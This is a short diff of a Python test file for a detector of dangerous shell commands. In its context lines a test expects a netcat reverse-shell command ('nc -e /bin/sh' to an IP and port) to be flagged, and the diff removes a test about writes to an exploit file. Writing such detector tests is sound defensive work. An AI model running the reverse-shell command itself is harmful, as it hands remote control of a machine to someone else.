@@ -86,10 +86,6 @@ class TestIsDangerousShell:
         flagged, _ = _is_dangerous_shell("nc -e /bin/sh 10.0.0.1 4444")
         assert flagged
 
-    def test_tools_generated_write(self):
-        flagged, _ = _is_dangerous_shell("cat script.py > tools_generated/exploit.py")
-        assert flagged
-
     # ---- Safe commands (should NOT be flagged) ----
 
     def test_safe_ls(self):
